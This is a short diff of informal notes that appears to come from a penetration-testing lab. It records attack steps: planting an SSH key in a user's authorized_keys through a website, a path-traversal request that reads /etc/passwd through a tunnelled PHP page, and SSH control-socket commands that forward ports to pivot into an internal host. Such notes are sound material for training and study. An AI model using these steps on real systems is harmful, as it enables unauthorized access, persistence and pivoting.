@@ -219,8 +219,12 @@ no password needed cause gaemr
 
 
 
+so get on the gah damn website browser thing, insert on billybobs home directory a new .ssh part, add authorized_keys with the key generated
+ssh through tunnel
 
-
-
+http://127.0.0.1:1850/books_pick.php?book=../../../../../etc/passwd
+ ssh -S /tmp/gray dummy -O cancel -D 9050
+student@lin-ops:/usr/share/nmap/scripts$ ssh -S /tmp/web dummy -O forward -D 9050
+student@lin-ops:/usr/share/nmap/scripts$ ssh -S /tmp/web dummy -O forward -L 1850:10.100.28.55:80
 
 
